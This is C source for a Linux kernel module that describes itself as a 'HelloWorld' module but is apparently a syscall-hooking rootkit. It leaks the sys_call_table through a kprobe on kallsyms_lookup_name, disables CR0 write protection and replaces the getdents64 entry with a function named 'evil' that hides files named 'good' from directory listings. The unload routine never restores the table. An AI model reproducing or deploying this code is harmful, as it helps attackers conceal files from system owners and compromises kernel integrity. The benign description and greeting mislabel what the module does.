#include <linux/init.h>   // included for __init and __exit macros
#include <linux/kernel.h> // included for KERN_INFO
#include <linux/module.h> // included for all kernel modules
#include <linux/kprobes.h> 
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/string.h>

MODULE_LICENSE("GPL"); // The license  under which the module is distributed.
MODULE_AUTHOR("Girish Joshi"); // The original author of the module (VZ).
MODULE_DESCRIPTION(
    "HelloWorld Linux Kernel Module."); // The Description of the module.


typedef void ** (*kallsyms_lookup_name_pointer)(char*);
asmlinkage long (*__x64_sys_getdents64_ptr) (unsigned int fd,
				    struct linux_dirent64 __user * dirent,
				    unsigned int count);


char to_hide[] = "good";


static char symbol[KSYM_NAME_LEN] = "kallsyms_lookup_name";

static struct kprobe kp = {
	.symbol_name	= symbol,
};



asmlinkage ssize_t evil(unsigned int fd, struct linux_dirent64 __user * dirent, size_t count) {
  unsigned long local_fd;
  struct linux_dirent64 __user * local_dirent;
  size_t local_count;

  asm volatile("movq %rdi, %rbx;");
  asm volatile(
    "movq 0x60(%rdi), %r8;"
    "pushq %r8;"
    );

  asm volatile(
    "movq 0x68(%rdi), %r8;"
    "pushq %r8;"
    );

  asm volatile(
    "movq 0x70(%rdi), %r8;"
    "pushq %r8;"
    );
  asm volatile("movq %rbx, %rdi;");

  ssize_t ret = __x64_sys_getdents64_ptr(fd, dirent, count);

  asm volatile(
    "popq %0;"
    : "=r" (local_fd)
  );
  asm volatile(
    "popq %0;"
    : "=r" (local_dirent)
  );
  asm volatile(
    "popq %0;"
    : "=r" (local_count)
  );


  // pr_info("Hijack completed !? >:(\n");
  char * temp_dirent_pointer;

  ssize_t current_size_read = 0;
  while(current_size_read < ret) {
    char * temp_char_pointer;
    temp_char_pointer = (char*)local_dirent;
    temp_char_pointer += 19;

    if(strcmp(temp_char_pointer, to_hide) == 0) {
      *temp_char_pointer = '\0';
      break;
    }

    current_size_read += local_dirent->d_reclen;
    temp_dirent_pointer = (char*)local_dirent;
    temp_dirent_pointer += local_dirent->d_reclen;

    local_dirent = (struct linux_dirent64* )temp_dirent_pointer;
  }

  return ret;
};

static void ** leak_sys_call_table(void) {
  int ret = register_kprobe(&kp);
  // if (ret < 0) {
  //   pr_err("register_kprobe failed, returned %d\n", ret);
  //   return ret;
  // }
  pr_info("kallsyms_lookup_name = %llx\n", kp.addr);

  kallsyms_lookup_name_pointer to_call = (kallsyms_lookup_name_pointer)kp.addr;
  void ** addr = to_call("sys_call_table");
  return addr;
};

// This function defines what happens when this module is inserted into the
// kernel. ie. when you run insmod command.
static int __init hello_init(void) {
  void ** sys_call_table = leak_sys_call_table();
  
  __x64_sys_getdents64_ptr = *(sys_call_table + 217);

  asm volatile("mov %0,%%cr0": : "r" (read_cr0() & (~0x10000)));
  *(sys_call_table + 217) = &evil;
  asm volatile("mov %0,%%cr0": : "r" (read_cr0() | 0x10000));

  printk(KERN_INFO "Hello world!\n");
  return 0; // Non-zero return means that the module couldn't be loaded.
}



// This function defines what happens when this module is removed from the
// kernel. ie.when you run rmmod command.
static void __exit hello_cleanup(void) {
  printk(KERN_INFO "Cleaning up module.\n");
}

module_init(hello_init);    // Registers the __init function for the module.
module_exit(hello_cleanup); // Registers the __exit function for the module.
